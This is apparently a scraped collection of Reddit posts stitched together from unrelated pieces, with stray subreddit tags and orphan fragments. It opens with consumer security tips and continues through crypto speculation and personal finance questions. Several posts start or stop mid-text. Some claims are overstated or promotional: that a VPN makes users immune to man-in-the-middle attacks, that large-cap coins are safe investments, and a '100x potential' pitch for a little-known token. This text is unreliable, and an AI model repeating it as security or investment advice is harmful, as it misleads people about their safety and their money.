A VPN is vitally important if you ever use public WIFI at a restaurant, store, workplace, hotel, etc.  It encrypts  your connection so that anyone looking at traffic on that network can't tell where you're going or what you're doing.  This keeps anyone from knowing what you're doing or where you're going, protects all your traffic, not just web sites, and makes you immune to MITM attacks.  I won't recommend any one VPN over any other, there are a lot of really good ones.  And there are websites that routinely rank them.  Do some research and pick one you like.  I personally use NordVPN but there are plenty of other top notch VPN's out there to choose from.

The big things to look for in whatever VPN you choose are:

1. Military-Grade Encryption (which basically means AES 256 or better. It's not really military grade, that's just a buzz term used by VPN providers)
2. Integrated Kill Switch that kills your internet connection if your VPN drops.
3. Maximum Connection Speed.
4. Unlimited Data Transmission.
5. Firewall.
6. Multiple Device Support.
7. Worldwide Servers.
8. VPN Blocking Prevention (some websites, like Netflix, try to block people using VPN's.  Make sure your VPN has blocking prevention as one of it's features if you plan to stream)
9. Split Tunnel availability (Useful for sites or apps that choke on VPN's, also useful for gamers who need to avoid latency for their video games.)
10. No Logging

Some 'nice to have' items:

* Multi-Hop VPN capability
* Anonymous DNS Server services
* Peer-to-Peer support (if you use any peer-to-peer network applications)

Note: If you have trouble using a website or app with your VPN you can use split tunneling (thus why it's on my must have list) to allow your traffic to and from that website to bypass your VPN.  Use sparingly but it may be necessary from time to time.

**Don't use any Browser Extensions that aren't for your security!**I can't stress this one enough.  Sure, you might be able to use a Facebook plugin in chrome to block all cute kitten posts, or whatever, but those extensions can contain keyloggers, track everywhere you go on the internet AND report them back to their creator/owner and even, in some cases, execute code on your system or take captures of what's on your screen.  Even benign extensions typically include a permission like: ""**Read and change all your data on the websites you visit**"".  Do you really want some random extension developer to have access to that kind of information on everything you do in your browser?  Even if that permission isn't included when you load it they can add it later and if you aren't paying attention you may miss it.

The only browser extensions I feel are worth it are ones that come with your antivirus or antimalware software and a good add blocker if one isn't built into your browser already.  (Believe it or not, there are malicious ads out there that CAN be used as a penetration avenue against your system and they can wind up on sites that you would typically trust, like Facebook, and others)  NEVER turn off your ad blocker, no matter what the website you're visiting bitches about.  I'd rather NOT read their content than turn off my add blocker.

**Important!** If you are using any extensions check periodically to make sure they're up to date and verify they haven't been discontinued.

**Android Don't:**Don't ever side-load apps.  Yes, you can side load apps.  No, it's NOT a good idea.  You have no way of knowing if that app is trustworthy or not.  And... guess what one of the most prolific hacks in side loaded apps is right now?  Jacking your phone and using it to mine crypto in the background... another big one is keylogging to steal crypto keys and, of course, ransomware, malware, etc.

**Some good habits to get in to protect yourself from Malware, Addware, Ransomware and Viruses:**

* Don't click on links in emails, SMS messages, Discord, etc.  Look at the URL and google the site to see if it's trustworthy first then ***manually*** type the address into your browser if it appears to be legitimate.  URL's can be faked in a number of ways.  Also always pay attention to the end of the URL (not the beginning) to make sure it's a real domain.  Google isn't [**www.google.com**](http://www.google.com)\*\*.mycoolwebsite.com\*\* (for example).  Also best to hover your mouse over the URL before clicking it.  This will usually show the real URL in a hovering textbox.  Make sure the URL is legitimate before using it.  You can also use Trend Micro's Site Safety checker or other URL checkers if you want to be extra careful.
* I highly recommend turning off dynamic display in your email (if you're not sure what this is, google it.  This is already getting longer than I planned).  Basically this turns off images, links, etc in your email and disables scripts.  Email is one of the most common ways hackers get access to you.
* Please remember:  No bank/exchange/website/whatever is EVER going to ask you to send them your password/secret word/whatever.  If you get a message/email/whatever of that type report it as phishing and block it.  The IRS (or whatever your country's tax institution is) isn't going to ask you for your banking information or your social security number (guess what, they already know what bank you use and they already have your SSN)  Don't ever give out private information to someone you aren't expecting a call from on the phone, SMS message Email or whatever and, even then, try to make sure you know that they are who they say they are before giving out any information.
* Don't download random crap from the internet!  Stick to trusted sources of files if you have to download something.  And even then use your antivirus program to scan it immediately after you download it.  Also check the file hash before extracting it.  This can be done using **Certutil -hashfile ‘filename’ sha256** in the windows cmd line (on Linux you can use **sha256sum ‘filename’**) you can then enter the hash these commands return into **VirusTotal.com** to see if it comes back malicious.
* Some applications will offer to install 3rd party software as part of their delivery.  I hightly recommend that you always decline those and then go get those applications **directly from the actual vendor**, yourself, if you want them.  At minimum the one wrapped into whatever installer you're using will be out of date and full of vulnerabilities.  At worst it could have a virus or malware or rootkits embedded.
* Consider using the TOR browser if you go to sites you don't fully trust (I recommend avoiding them but if you feel you MUST go to them, be safe about it).  It's a fork of Mozilla with some built in security settings to help prevent it from being compromised and it uses built in 3 hop protection (beyond your VPN) to keep you even more anonymous when browsing.  Another good alternative is the BRAVE browser.",cryptocurrency

cardano,The supply of Cryptocurrency,"I'm new to cryptocurrency so please excuse my unwrinkled brain! I am having some trouble understanding which crypto is the best to get into. The reason I am posting here is because I think Cardano might be it, but I have a few questions still. Also, it seems to me that Cardano apes may have the most wrinkles. 

Specifically with the supply of crypto tokens. I understand that each crypto has it's own method of generating their tokens, but is there any thought as to which is the best? As in, is it more advantageous to have a large supply and quick token generation? Or a small supply and a lengthy generation? Or maybe somewhere in the middle? Or does it matter at all?

The way I see it, and I don't know if I am right, is that it you can model this using simple economics. If I buy 1 token when 100 are available, I own 1/100th of the overall value of the currency. If that currency's token supply for some reason increases to 200, I now own 1/200th of the overall value. Effectively halving the value of my token. Thinking about it economically, stable slow inflation rates are preferable because it encourages people to use their money which drives commerce and doesn't immediately kill value. That's why the FED is so concerned with keeping inflation rates at 2% for the USD. And so, my thoughts are that a sustainably generated crypto would be the most stable and therefore worthwhile to invest in. Whereas as a coin like DOGE would inflate too quickly and bitcoin has the chance to deflate which could cause massive volatility/eventual loss of demand. And so, my questions are as follows: 

\- Does the supply and generation have a noticeable effect on the value of a crypto's token? Or is this completely unrelated to it?

\- Is the supply of a cryptocurrency something that investors take into consideration when evaluating cryptos? 

\- If so, which are the most stable coins? (note I do not what to invest into stablecoins lol) Also how is this mapped? Does the blockchain give out token at a rate set by the cryptos creators to manipulate the value directly? 

\- Is inflation taken into account when creators make coins? Do they plan for the coins value ahead of time?

\- Are there any resources that discuss this topic further?

Any help would be appreciated!",cryptocurrency

Also the larger the cap, the  safer the investment in the coin. ""Large-cap coins are generally considered to be safe Crypto investments.

stocks,$SENEA Senaca Food Corperation DD. What do you think? Am I doing it right?,"I started this crazy adventure at the end of January during the whole GME craziness.  I decided to really buckle down and try to learn as much as I can about investing.  I have learned a lot, and I would like to know how I am doing in performing my own DD.  I might have gotten some things wrong but that's why I am posting this so I know if I'm doing it right or I need to fix how I'm doing things.

I've tried to use certain things that would catch my eye to give me a starting point when looking for companies to invest in..  While looking on Finviz, one of the things I learned about in my self education, is looking for companies with a low P/E ratio.  So I started there.  Looking for companies with a low P/E ratio,  I came across a company I am familiar with.  Growing up in a rather heavy agricultural area, a company many are probably familiar with as well, is Seneca Food Corporation.  

Seneca Foods Corporation provides packaged fruits and vegetables in the United States and internationally. The company offers canned, frozen, and bottled produce; and snack chips and other food products under the private label, as well as under various national and regional brands that the company owns or licenses, including Seneca, Libby's, Aunt Nellie's, READ, Green Valley, Paradise, Seneca Farms, and CherryMan. It also packs Green Giant, Le Sueur, and other brands of canned vegetables, as well as select Green Giant frozen vegetables for B&amp;G Foods North America under a contract packing agreement. In addition, the company engages in the sale of cans and ends, as well as trucking and aircraft operations. It provides its products to grocery outlets, including supermarkets, mass merchandisers, limited assortment stores, club stores, and dollar stores; and food service distributors, industrial markets, other food packagers, and export customers in 90 countries, as well as federal, state, and local governments for school and other feeding programs. The company was founded in 1949 and is headquartered in Marion, New York.

https://finviz.com/quote.ashx?t=SENEA. 

Going by a formula of anything with a P/E under 15 is good, SENEA has a P/E of 3.39.  The next thing I looked for is the Debt/Earnings and LTDebt/Earning ratio where anything under a .45 is good.  I found its D/E ratio is at a .25 and the LTD/E is at .23.  Next its the current assets to liability where anything over 1.5 is preferable.  It was at a 3.69.  Then it's to the PEG, 1-1.5 is good and SENEA is at 1.55.  P/S is next and it is good to have anything less than 1-2 and SENEA comes in at .30.  P/B needs to be anything less than 1.5 and it's coming in at .88.  Lastly is the P/FCF where under 15 is great over 20 is bad.  SENEA shows a 7.77.  

So far by these numbers that I am seeing, Seneca Food Corp is a pretty solid company to invest in.  Being one of the main food packaging companies in the US they will probably be around for a long time.

personalfinance,Is taking out a personal loan for grad school abroad a dumb idea?,"I (an American) have been accepted into a one year masters program in Austria. I need to obtain a Student Resident Permit due to the length of the program. I was granted a partial tuition waiver, but no monthly stipend from the school. Either way, going here will be far less expensive than to the school I was accepted to in the US. One of the requirements is that I must have proof of funds of at least **€1000.40/month** (approximately $15k US with recent conversion rates) in a bank account accessible to me. I currently have just over $9.3k saved safely, and will add to it each week as I am paid weekly (It will be at least $200/week, if not more depending on the week).

I have little doubt that by September I can come up with the needed money, since in addition to whatever I save from work, I will also get my security deposit back plus whatever I can get from things that I will sell but cannot sell until I am moving (like furniture). Combined, these will total in my estimation to be probably around another $1700 or so.

The kicker is, the program begins in September, and the permit process takes at least three months, so I need to get everything in by the end of May at the very latest from what I understand (neither the embassy nor the internet has been very helpful regarding specifics). So I am left in a sort of a bind. A personal loan of \~$5000 or so does seem like it could be a solution. I have fairly good credit (over 730), and the interest rates that I have seen in ads don't seem too terrible, similar if not lower than my federal loans from undergrad. Private student loans seem to have both a higher interest rate than personal loans and the money would go directly to the school, which doesn't look like it would help my application. With the Student Resident Permit, I also can work for up to 20 hours/week in Austria, which I do plan on doing, so I wouldn't necessarily be falling behind on payments. Is this a decent idea, or is this really dumb? If this is a decent idea, what lenders should I look into or be wary of? Are there other ideas that I am missing?

personalfinance,Mint is not working for me-- what do I do?,"I have been using Mint for nearly a decade but Im at my wits end.

Other issues is that we have 2 cards and one income; One Visa and one Amex is shared between myself and my wife.  

If it were just me, I feel like I could Fort Knox my budget and carefully plan.  But I have a stay at home wife who needs access to a card for groceries, gas, expenses for the children, and of course for herself to keep her mentally healthy.  

I have walked through the budget with my wife and she 'gets it' but I don't think she gets how quickly small purchases can add up.
I, of course, have access to the budget at my finger tips and can follow along but I feel like some budget enforcer.  'Hey honey, too much on shopping this month, try to do better next month'.  'Hey honey, were maxing out our budget this month and its only the second week'. etc.  

Its just not working; between Mint and AmEx not syncing up, limited visibility of the budget for my wife...
so what the hell do I do?  

I want to ramp up my savings for 401k and build up cash savings but its impossible right now when I feel like I cannot effectively communicate and work a budget with my wife as a team.  I am just not sure if a tool can do this for us effectively or what. Of course I have communicated this to her, and she gets it and agrees with having a stable retirement, cash savings, etc etc.. but that hasn't been what were actually *doing*.

CryptoCurrency,Ethereum: We Haven't Seen Anything Yet!,"While, I know it is no secret the potential that Ethereum has. It is the number two ranked cryptocurrency in-terms of market cap after all. **But I'm here to tell you that you haven't seen anything yet. This post is only related to ETH Price and ETH2 Staking, not any tech discussion, which is ofcourse ETH's strongest point! However, we all know how less of a role tech plays in a bull run.**

**But please remember, that everything in this post is mere speculation, and may not come to be.  So as always, please do your own research.**

While ETH 2.0 has famously seen delay after delay; late last year phase 0 did launch and it included one of ETH 2.0's most hyped features. The ability to stake your ETH for a passive income.

Many people probably already earn a passive income from lending out their Ethereum to places like BlockFi or Celsius. But in those situations, always remember that you are giving up the custody of your coins to those services. There is a high risk that you could lose everything. On the other hand. ETH 2.0's staking has the coins in a smart contract on the ETH blockchain. While you do have to lock them up for a certain duration of time; you do still retain custody of your coins. This is considered a much safer option than lending out your coins to a third party company.

Up until this point the interest rate has been great so far as well. Ranging from 7% to upwards of 12%. The only downside has been that if you do decide to stake your ETH into the ETH 2.0 protocol; you would have to then lock up your ETH until ETH 1.0 and 2.0 fully merge. The issue is that no one knows exactly when this will happen. It could happen three months from now. It could be 1 year from now. It could be 2 years from now. No-one knows for certain.

I recently saw an Ethereum 2.0 developer make a Twitter post about what he thinks could possibly be the initial interest rate for ETH after 2.0 has fully launched, and the changed have merged. The rates he was saying were quite high and interesting to say the least.

https://preview.redd.it/usb59vm7oku61.png?width=401&amp;format=png&amp;auto=webp&amp;s=a002dc66cdd0bfe9e664c035d2cdb0b6afa5dd1a

If his prediction does come true and results in an initial 25%+ staking interest rate for Ethereum; this would change everything. First you need to take into account the ETH EIP 1559 protocol that will soon be introduced. This will result in ETH being burned in every transaction and could actually make Ethereum a deflationary coin.

But if there is anywhere near a 25% interest rate for staking, everyone will come and put there money into Ethereum.  There are other coins that have staking rates higher than that, but I wouldn't ever put any of my confidence into those coins. This is Ethereum that we are talking about here, one of the two blue chips of cryptocurrency. This could be the next great way to make a great passive income. For all of those people who were fortunate enough to accumulate 32 eth; just staking alone could be enough to grant you financial freedom in the future.

https://preview.redd.it/vvhrdudioku61.png?width=793&amp;format=png&amp;auto=webp&amp;s=1a12ef6ace6f156117b802ac74dd0671f2f197cc

But look at the chart that he made. He listed that a 25% rate was his best guess of what could happen, but the rate could be even higher than that.  Of course this is just speculation, but if it would come true, it's enough to make you want to throw a lot more money into Ethereum. The developer is claiming that this interest will come from the ETH staking issuance reward, but also from transaction tips that would have normally been given to miners in the past. But since there will no longer be any mining on ETH in the future, it would then go to the stakes.

While in my opinion, if that kind of rate does exist for Ethereum; I don't think it would last very long. That incredible rate would attract everyone to stake a large amount of ETH which would probably drop that rate further. But like I said, it is very fun to think about.

So what do you think? Do you think this kind of staking rate would be possible on ETH 2.0?  Have you reached your Ethereum accumulation goals? And what is your price prediction!",cryptocurrency

personalfinance,Should I take a 401k withdrawal for large unforeseen home repairs?,"I hate that it’s come to this, but here I am. I bought a house last January. It’s in an area prone to foundation problems, but the inspector and others that looked at it said it seemed fine. The roof also was on its last legs and needed to be fixed. 

I’m under contract with a roofer now to put a new one on for the end of the month for $8k. I’m getting a few interior rooms painted shortly after for $1,500 (already under contract and sent deposit - friends business). 

I’m also recently engaged and paying off the engagement ring ($5k left of original $8k) and working towards paying for the wedding (budgeting $30k, already sent numerous deposits). 

A couple of weeks ago, I had a leak in my finished basement. I’ve had three contractors come and take a look at it, and all agreed that the foundation is bowing and needs to be reinforced before it gets worse. The estimates range from $15k to $25k to repair it. Due to the water leak and a door in the basement not closing properly, along with the foundation pushing up against gas and water lines, it needs to be fixed - sooner rather than later. 

I have around $20k in the bank right now, and various investments totaling $25k (crypto, mutual funds, NFTs, stocks). I would really rather not pull out of these as I’m pretty bullish on my investment prospects but understand I might have to. The roof is coming out of a joint savings account I have with my fiancée, but that will pretty much exhaust it (save for our future mortgage payments). 

I make $80k a year. I have a stable job with the Department of Defense and have a TSP (government retirement) and will have a pension in retirement, as will my fiancée. 

I have about $35k in old 401ks from two jobs I had before I had this one. I’ve been lazy and never rolled it into my TSP. I’m considering just liquidating both and having it repair for my foundation problems, and with whatever is left use to pay off my fiancees ring. 

I have no other debt to speak of other than the ring and the mortgage.

personalfinance,Advice Needed: Mortage,"Hi.

I am trying to help my mom out with her mortgage. Right now, she is with a mortgage company. She bought her house in 2017, and her current interest rate is 4.250%. Does it make sense for her to refinance? Can she refinance with a bank instead? Is that a smarter idea? I am just trying to make sure she is doing what makes the most sense with her mortgage. All helpful suggestions are appreciated!

Thanks!

15. Proof of Stake

Qualitative Data 

1. Open ecosystem designed to integrate decentralised applications into a cohesive whole.The Decenteralised protocol UBIX (DAG, consists of blockchains of various types) has been developed to exchange master data between applications. The Ubikiri super application interface, built on microservices is used to exchange edata between applications via the internal API. For the development of applications the UBIX launchpad platform is used, this launchpad is integrated into the Ubikiri interface. A special approach called fair-ICO (fICO) is used to finance internal projects. The first project was the UBIX exchange. UBIX ($UBX) - A Digital Universe with Endless Possibilities. Ecosystem overview

2. Target market would be the entire crypto space really. 

3. In order to implement the possibility of creating integrated blockchains the following approach was used. 
   a. Users can create their own blockchains(in terms of the platform consiliums),
   b. Each transaction has a special ;ane; that defines which consilium can process it.
   c. When the conditions defined by the consilium rules appear, consilium is activated and transactions accumulated in the mempool related to this consilium are processed.
   d. When the block created by consilium goes to the general deistributed ledger, where the blocks are connected to each other in a merkle tree, forming a DAG. i. Network node can form subsets that implement certain rules, Each group is called a Consilium (in case you were wondering)

4. DAGs are fairly new to the crypto space from what i can tell. UBX has the potential to be special, I see very few reasons why this can't be successful.

5. From what little information i could find online about the team they seem solid and have alot of experience in the crypto space. They were founded and majority based out of the Russian federation (Probably why there is a lack of info) The Co-Founder Max Breus, also co_founded Silent notary. Studied both law and at the institute of physics and technology in Moscow. Aleksey Petrov was the CFO at silantNotary, He also co-founded UBIX, he also has experience in the finance space. Johan Struijk is the CMO of UBX and worked as an advisor at SilentNotary also. He has experience working as a CEO of a decentralised escrow service. He is focused on marketing and branding at UBX. Link to full team Team - ubix.network

6. Info about the exact token distribution is unavailable.

7. Direct link to full roadmap Roadmap - ubix.network

8. Whitepaper outlined in point 1 

9. Active telegram with 16,000+, Active Twitter Also. Also have an active medium. Looks good.

10. Partnered with Acceleration group, Leader in BIM tech and manager of complex construction projects. Together creating a joint blockchain laboratory, by doing so this will introduce blockchain to the international construction industry. Further info here Partnership announcement: UBIX.Network and Acceleration Group | by UBIX.Network | Medium

11. As far as i could tell, no upcoming events. May be more AMA’s. 

12. AMAs available on telegram https://t.me/ubixAMA 

13. No concerns we can see as yet, as project is still in the early stages. 

Everything seems sound at present,
Recap- Very solid looking project with 100x potential long term. Still very early to the party and i don’t have any major concerns apart from lack of initial token distribution data due to UBX being born out of a swap where-by you had to swap $SNTR for $UBX. Hopefully data is available regarding token distribution of $SNTR. Again no major concerns.
My personal verdict is that i will be purchasing a small position in this project as believe it has huge potential and could reach the $1B club.

Managed to source some Info on the Allocation of funds raised by $SNTR token sale

50% Marketing and Promotion 
20% Legal Status, Experts in different legislations, and introduction of legal practise 
20% R&amp;D 
10% Staff and operational costs

This clears up my one red flag which was lack of into regarding token distribution which could have allowed the team to hold a large % and sell at massive profits later. I am confident this is not the case and the distribution of UBX is fair. 

Professional team and professional project.

Bitcoin,Ask yourself,"Each family is getting $300 per month for each child under 6 and $250 for each child over 6 as part of the 1.9T stimulus. This is an extremely inflationary policy. Ask yourself when is this stimulus going to end, and why did the Fed stop reporting money supply figures around the time this stimulus is being injected?

I can tell you why. It's because looking at how the chart is going to make a straight vertical in such a short term period of time will make everyone lose faith in the USD and cause everyone to run for the exits.

personalfinance,"19yo, looking to maximize savings and get into investing but not sure where to start, was looking into Ally Bank but after looking it up on reddit I'm unsure. (US)","I am 19yo and am currently employed with two jobs and am a full time student. I have a decent amount of savings that I am just sitting on and am looking to either get one high yield CD or to ladder a bunch of 6 month or 1 year ones. I would also like to get into investing and have created an investment account through Ally Bank already, where I put basically the minimum amount of money just to see how it goes and if Ally Bank is reliable. 

While looking into Ally Bank more, I was really interested in their money master account to put the money from my savings in because currently I'm at Chase and their APY is 0.01% lol, while Ally's is 0.50%. I've looked up Ally bank on Reddit and some people say to run, while others swear by them. I'm very confused on what to do with my savings, especially because I'm extremely hesitant to put the majority of my savings in investments when I need to pay for housing and other college expenses every six months or so and in the next few years I hope to buy an apartment. (From what I understand, investments really become worth it if you leave your money to cook for around 5 years, but please correct me if I am wrong.)

I'm also unsure if I should open a Roth IRA, especially if I may need to apply for loans for grad school/med school. I currently do not have loans for undergrad. Please let me know if you think a Roth IRA would be the smartest right now.

My questions are should I create an Ally bank's money master account (0.50% APY) or would it be smarter to ladder high yield CDs with Ally? Is there another bank that you feel is more trustworthy and easier to work with for either a money master type account or for CDs? Is there something else that you think would be smart to do given my age like a Roth IRA given I might need federal loans in the future?

personalfinance,"Take lower-interest loan to pay higher-interest loan? Having trouble reasoning through, help appreciated!","I am trying to figure out a loan situation and what is most beneficial in the short term as I hope to aggressively pay my higher-interest loans off. This is an actual life situation, not a homework problem!

I currently have several loans, some of which are at higher interest rates (7.08%). I am able to take a loan at a lower interest rate (5.3%), but will have a one-time origination fee of 4.228%.

In my math, the first year cost of the higher interest loan is less, but it is comparable the 2nd year, and by the 3rd year it was wise to have paid the high-interest loan with the low-interest loan. I would take a $6000 loan at 5.3% annually with the 4.228% origination fee, and have $5746 of that be usable to pay towards another loan which sits at 7.08%.

5.3% $6000  - amount of loan in year 1, 2, 3 - $6318. $6652. $7005.

7.08% $5746 - amount of loan in year 1, 2, 3 - $6153. $6588. $7055.

I wish I could drop in my excel workings, but it is restricted by the sub.

Is my thinking/math on this right, or is this simplified and I'm missing something? It is also important (outside of the math component) to say that these are government loans which are currently on hold at 0% - I don't expect this to last forever, so I want to make dents while I can. If anyone has a different opinion of how to approach this based on that current 0% rate, please feel free to chime in. I'm sure political views can affect this, so anything rather objective is appreciated.

Separately, I do have lower interest loans at 5.0% which are **currently accruing**. Based on my math, it may be better to immediately throw the 5.3% loan at these, which would pay for itself in less than 1 year. The $6,000 loan at 0% interest costs $6000 in year 1, while the usable amount of $5746.32 could be paid towards a loan actively accuring at 5%, saving $33 ($6033.64) in the first year alone.

Is my math even right on this stuff, or am I missing something? Thanks a lot.",finance

personalfinance,Advice on a budget for certified used vehicles in in NYS? Single life/ income and main goal to retire at 55.,"30 years old, New York but not the city. Single income. Bring home about 37k annually after taxes, deductions, contributions etc. A bit over 35k saved up/ accessible. 50k in inheritance. I do not touch that. I did not earn that.

Contributing 15% of my pre-tax income to 401k, so could be less aggressive with that to temporarily increase my car budget if needed.

$0 debt. No student loans, no credit card debt. Total bills approx. $1400/ month including rent, groceries, utilities, car insurance, gas etc. (Very modest base expenses/ living; weaknesses are the spa and fine dining. Pandemic afforded me more to save based off of these things.) Rest is saved or only spent as seen.

Obviously don't want to dump all my savings into a car, or be car-poor every month until it's paid off. 

Mostly prioritizing saving for a down payment on a house, but with the market so overpriced, decided to just get a newer car. 

Had mine about 10 years (it's 14 this year), it's still in good shape/ well maintained, but 185k. (Like I said, modest living)

Want a practical, yet much nicer car to buy/ start to pay off while I don't have to put all the miles on it/ use older car for commute car til it dies/ ride it til the wheels fall off, basically.

Then won't have to scramble to find a newer reliable vehicle when my current car finally kicks the bucket.

Everywhere I see, a car budget is (supposedly) roughly 1/4 of your income... but thats just taking payments into account, I think? Ideally I would like to buy the car outright, or at absolute minimum 1/2 down. 

Always lived by ""if I can't even afford half rn, I shouldn't be getting it"" on big-ticket items that depreciate, like cars, bikes, kayaks, etc etc. Like I said, living modest and focused on long term gain/ reward with my expenditures.

I understand that's not the way most of the world thinks/ works, so I need help figuring out what my real down-payment and budget should be. Will likely drive this ""new"" car 7-10 years so want to have a good budget for my choice vehicle.

For reference: thinking an HRV since it has awd. Or maybe Subaru Outback or Forrester. Was thinking like 2015-2017, but I see the ""new"" car loans/ better interest rates only extend to 2018/ 3 years old, so that's definitely something to consider.

Hoping for advice on where to start. So overwhelmed.

Don't really want to spend more than 10k out of my savings, max. But I guess if I had no car payment maybe it's worth it to go up to maybe 15k outright? Haven't bought a car since I was 20, had a budget of 7k, and my dad helped me haggle. Lol

Hoping my total car insurance and car payment combined is less than 450/ month, as I think that's the most I can swing without making any significant lifestyle changes.

I already have awesome credit bc everything is in my name and has been, so I don't really need the additional credit but I feel like it doesn't hurt? But why overspend?

The transition can be unsettling in terms of asset price volatility, but if you map the behaviour of the herd in cycles, it can get a lot more predictable. 

This is exactly what is currently happening in markets, where assets are adapting to higher long end interest rates and economies are less jittery about Covid-19.

CryptoCurrency,Hal Finney in 2010 on Bitcoin-backed banks in the future. RIP to a visionary.,"Hal Finney was first person to ever receive a Bitcoin transaction, from Satoshi Nakamoto himself. What a legend. He was truly a visionary. It’s pretty amazing that he was thinking about this all the way back in 2010. This kind of monetary system is something I could truly get behind. With Visa, MasterCard, Venmo and PayPal all entering the cryptocurrency space and settling transactions on Bitcoin and Ethereum to central banks creating their own digital currencies, it’s all coming together. 

https://bitcointalk.org/index.php?topic=2500.msg34211#msg34211

&gt; Actually there is a very good reason for Bitcoin-backed banks to exist, issuing their own digital cash currency, redeemable for bitcoins. Bitcoin itself cannot scale to have every single financial transaction in the world be broadcast to everyone and included in the block chain. There needs to be a secondary level of payment systems which is lighter weight and more efficient. Likewise, the time needed for Bitcoin transactions to finalize will be impractical for medium to large value purchases.

&gt; Bitcoin backed banks will solve these problems. They can work like banks did before nationalization of currency. Different banks can have different policies, some more aggressive, some more conservative. Some would be fractional reserve while others may be 100% Bitcoin backed. Interest rates may vary. Cash from some banks may trade at a discount to that from others.

&gt; George Selgin has worked out the theory of competitive free banking in detail, and he argues that such a system would be stable, inflation resistant and self-regulating.

&gt; I believe this will be the ultimate fate of Bitcoin, to be the ""high-powered money"" that serves as a reserve currency for banks that issue their own digital cash. Most Bitcoin transactions will occur between banks, to settle net transfers. Bitcoin transactions by private individuals will be as rare as... well, as Bitcoin based purchases are today.",cryptocurrency

I just wanted to run this by you guys to see what you thought might be the best option(s). 

Currently, I am looking to install an 11.44 kW system on my 1500 sq/ft house. My wife and I do not intend to live here the rest of our lives but find that here in sunny Southern California, this will be a worthy investment for us as we'd like to rent our current house out and purchase a new one eventually. 

We plan to at minimum live in this house for the next five years, and by then, we can afford a new home with a separate down payment (at least that's the goal). Yes, I have an electric car, Tesla Model Y, and drive about 25,000 miles a year (traveling salesman). 

System Notes:

* 26 x 440 Watt Panels (REC440AA 72) generating about 17,775 kWh per year with Enphase inverters. 
* **25-year workmanship warranty** on Solar System, 10 years on Batteries / Storage. 
* **25-year leak protection warranty.**
* **25-year product warranty**: covers panel defects.
* **25-year performance warranty**: ensures panels perform precisely as they're expected to – every year for 25 years. At least 92%\* of power in year 25 (an industry-best, with REC Alpha      panels).
* **25-year labor warranty** **(from REC - the manufacture):** gives added protection if a panel needs to be serviced from the manufacturer.
* Installing through a local company here in Southern California that has excellent reviews, honest workers, and came with great recommendations. I feel very comfortable with them.

* Total System Price $32,000
* Federal Tax Credit: $8,320
* Net System Cost: $25,396.80

Anyway, here are the financing options, and I'm wondering which you guys will think is best:

1. Sunlight loan - cost system jumps from $32,000 cash price to $43,537, the interest rate set at 0.99% assuming I give them the tax credit back after 16 months. The monthly payment is something like $157 per month. The benefit of this is I get a higher tax      credit? 
2. Regular Loan Through Local Credit Union - $32,000 (total cost of the system) financed at 4.99% interest rate 20-year loan. The monthly payment is $255, and I can pay it off anytime. 
3. Pay cash and pay it off in full. 

To me, considering we may or may not live here another 7-10 years (we will be here five years minimum), #2 sounds like the best option, but I wanted to see what others think.

Thank you for any advice!",energy
personalfinance,Home loans - Lender bidding war,"Hi all,
Hoping someone could give me some advice here. In short, I have a home purchase contract accepted and trying to get the best financing deal before the mid-May closing.
I have two lenders from two companies I’ve been chatting with. They’re both aware of each other and repeatedly state that they’ll “match or beat [the other guy]” in terms of rate/closing costs.
AITA if I try to get them both on a call to basically debate rates and fees and see which one can actually go lower?
- Credit score is just below 700
- Financing about 500k
- Both lenders have stated they can do at least 3.25% and about 1000 closing costs. (One says I could even get some money back if the Fed rate goes lower before closing)
TIA,
A stressed out homebuyer",finance

cardano,Cardano Rumor Rundown APR 22 2021,"Hey Everyone!

Let's go....

Newly covered today:

1. Recap from yesterday:  the Africa Special Announcements revealed some additional puzzle pieces 1) COTI’s AdaPay is possibly the larger payments infrastructure puzzle piece, 2) [payway.et](https://payway.et/) is possibly the local payments puzzle piece, 3)  [yellowcard.io](https://yellowcard.io/) is possibly the local coin exchange puzzle piece, and 4) World Mobile (not mentioned at [africa.cardano.org](https://africa.cardano.org/) AFAIK) may be the network connectivity puzzle piece. I think they are going to connect a lot of disparate pieces for us on the 29th.
2. Once again we are the champions! Not just of github commits this time, but also of total staked asset value. [https://www.stakingrewards.com/](https://www.stakingrewards.com/)
3. Rick interviewed CardStarter which is a Cardano accelerator. The interesting items are 1) it appears they are purporting to somehow insure their community backers against certain financial losses with caveats, 2) it sounds like they plan to fund projects prior to token launch through token vouchers, and 3) they are building a DEX called Card Swap. Notice that the “insurance” comes with caveats.  They were very transparent on that point and people should take notice. Is CardStarter good? Is it bad?  I have no idea.  Watch the interview and form your own opinion.  [https://youtu.be/nIklWKtr\_aY](https://youtu.be/nIklWKtr_aY) [https://cardstarter.io/](https://cardstarter.io/)

Previously Covered but still interesting:

1. Charles posts a pic of a taxidermy African bird called a Turacos. He follows up that post by saying ""Guys sometimes a stuffed Ethiopian exotic bird next to an old identity book is just a stuffed Ethiopian exotic bird next to an old identity book. Stop reading into things"". Everyone enjoys speculating what exactly this could mean with the obvious implication being that the African bird announcement involves digital identity in Ethiopia. [https://twitter.com/IOHK\_Charles/status/1369397063583227911](https://twitter.com/IOHK_Charles/status/1369397063583227911) [https://twitter.com/IOHK\_Charles/status/1369402020067766275](https://twitter.com/IOHK_Charles/status/1369402020067766275)
2. t's announced that 591 different assets have been minted on Cardano in the last eight days. [https://twitter.com/IOHK\_Charles/status/1369347294324162561](https://twitter.com/IOHK_Charles/status/1369347294324162561)
3. Charles says they are actually going to hire investigators for the IOG anti-scammer team. People with a law enforcement or intelligence background should feel free to apply. Should have a report on the team’s first investigation soon. Hopefully, this will contribute to scammers actually actively avoiding (those alliterations tho!) Cardano. Could also be a nice basis for an intelligence apparatus and private military when we build the Cardano Citadel. I mean somebody is gonna have to man the watchtowers if we’re gonna keep out all the no-coiners and ETH people. Kidding...kidding. [https://youtu.be/6God9Xtzuqs](https://youtu.be/6God9Xtzuqs)
4. Cardano hodler Ben Askren continues preparations for his boxing match with Jake Paul. Being a Cardano hodler, it is already a foregone conclusion that Askren’s aura will cause Jake Paul to refuse to fight before the opening bell even sounds. [https://twitter.com/Benaskren/status/1286094545973846017](https://twitter.com/Benaskren/status/1286094545973846017) [https://twitter.com/Benaskren/status/1376021472993480705](https://twitter.com/Benaskren/status/1376021472993480705)
5. We hit 100% decentralization of block production tomorrow. Breath it in, friends. Taste the sweet completely decentralized air. Many crypto ecosystems will never know that feeling. [https://twitter.com/InputOutputHK/status/1376527930159816706](https://twitter.com/InputOutputHK/status/1376527930159816706)
6. Today is D-Day, d=0, complete decentralization of block production as covered in preceding days. Enjoy it guys!!!
7. The Daedalus wallet now supports native tokens! [https://twitter.com/InputOutputHK/status/1376936748715020288](https://twitter.com/InputOutputHK/status/1376936748715020288)
